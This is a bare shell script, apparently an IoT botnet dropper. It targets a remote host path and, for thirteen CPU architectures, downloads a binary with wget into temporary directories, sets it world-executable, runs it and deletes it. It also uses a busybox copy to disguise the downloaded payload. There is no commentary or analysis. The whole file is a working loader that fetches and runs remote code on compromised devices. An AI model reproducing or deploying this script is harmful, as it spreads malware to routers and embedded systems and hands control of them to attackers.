#!/bin/bash
ulimit -n 712

path="http://unicorn.d3dx9.ch/bin"

mips="mips"
mipsel="mipsel"
armv4l="armv4l"
armv5l="armv5l"
armv6l="armv6l"
armv7l="armv7l"
i586="i586"
i686="i686"
m68k="m68k"
sh4="sh4"
powerpc="powerpc"
powerpc440fp="powerpc440fp"
x86_64="x86_64"

if [ -f /bin/busybox ]; then
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; /bin/busybox cp /bin/busybox .; /bin/busybox wget $path/$mips; /bin/busybox cat $mips > busybox; /bin/busybox chmod 777 busybox; ./busybox; rm -rf busybox
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; /bin/busybox cp /bin/busybox .; /bin/busybox wget $path/$mipsel; /bin/busybox cat $mipsel > busybox; /bin/busybox chmod 777 busybox; ./busybox; rm -rf busybox
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; /bin/busybox cp /bin/busybox .; /bin/busybox wget $path/$armv4l; /bin/busybox cat $armv4l > busybox; /bin/busybox chmod 777 busybox; ./busybox; rm -rf busybox
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; /bin/busybox cp /bin/busybox .; /bin/busybox wget $path/$armv5l; /bin/busybox cat $armv5l > busybox; /bin/busybox chmod 777 busybox; ./busybox; rm -rf busybox
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; /bin/busybox cp /bin/busybox .; /bin/busybox wget $path/$armv6l; /bin/busybox cat $armv6l > busybox; /bin/busybox chmod 777 busybox; ./busybox; rm -rf busybox
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; /bin/busybox cp /bin/busybox .; /bin/busybox wget $path/$armv7l; /bin/busybox cat $armv7l > busybox; /bin/busybox chmod 777 busybox; ./busybox; rm -rf busybox
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; /bin/busybox cp /bin/busybox .; /bin/busybox wget $path/$i586; /bin/busybox cat $i586 > busybox; /bin/busybox chmod 777 busybox; ./busybox; rm -rf busybox
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; /bin/busybox cp /bin/busybox .; /bin/busybox wget $path/$i686; /bin/busybox cat $i686 > busybox; /bin/busybox chmod 777 busybox; ./busybox; rm -rf busybox
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; /bin/busybox cp /bin/busybox .; /bin/busybox wget $path/$m68k; /bin/busybox cat $m68k > busybox; /bin/busybox chmod 777 busybox; ./busybox; rm -rf busybox
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; /bin/busybox cp /bin/busybox .; /bin/busybox wget $path/$sh4; /bin/busybox cat $sh4 > busybox; /bin/busybox chmod 777 busybox; ./busybox; rm -rf busybox
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; /bin/busybox cp /bin/busybox .; /bin/busybox wget $path/$powerpc; /bin/busybox cat $powerpc > busybox; /bin/busybox chmod 777 busybox; ./busybox; rm -rf busybox
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; /bin/busybox cp /bin/busybox .; /bin/busybox wget $path/$powerpc440fp; /bin/busybox cat $powerpc440fp > busybox; /bin/busybox chmod 777 busybox; ./busybox; rm -rf busybox
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; /bin/busybox cp /bin/busybox .; /bin/busybox wget $path/$x86_64; /bin/busybox cat $x86_64 > busybox; /bin/busybox chmod 777 busybox; ./busybox; rm -rf busybox
else
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; wget $path/$mips; chmod 777 $mips; ./$mips; rm -rf $mips
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; wget $path/$mipsel; chmod 777 $mipsel; ./$mipsel; rm -rf $mipsel
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; wget $path/$armv4l; chmod 777 $armv4l; ./$armv4l; rm -rf $armv4l
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; wget $path/$armv5l; chmod 777 $armv5l; ./$armv5l; rm -rf $armv5l
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; wget $path/$armv6l; chmod 777 $armv6l; ./$armv6l; rm -rf $armv6l
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; wget $path/$armv7l; chmod 777 $armv7l; ./$armv7l; rm -rf $armv7l
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; wget $path/$i586; chmod 777 $i586; ./$i586; rm -rf $i586
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; wget $path/$i686; chmod 777 $i686; ./$i686; rm -rf $i686
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; wget $path/$m68k; chmod 777 $m68k; ./$m68k; rm -rf $m68k
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; wget $path/$sh4; chmod 777 $sh4; ./$sh4; rm -rf $sh4
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; wget $path/$powerpc; chmod 777 $powerpc; ./$powerpc; rm -rf $powerpc
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; wget $path/$powerpc440fp; chmod 777 $powerpc440fp; ./$powerpc440fp; rm -rf $powerpc440fp
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; wget $path/$x86_64; chmod 777 $x86_64; ./$x86_64; rm -rf $x86_64
fi
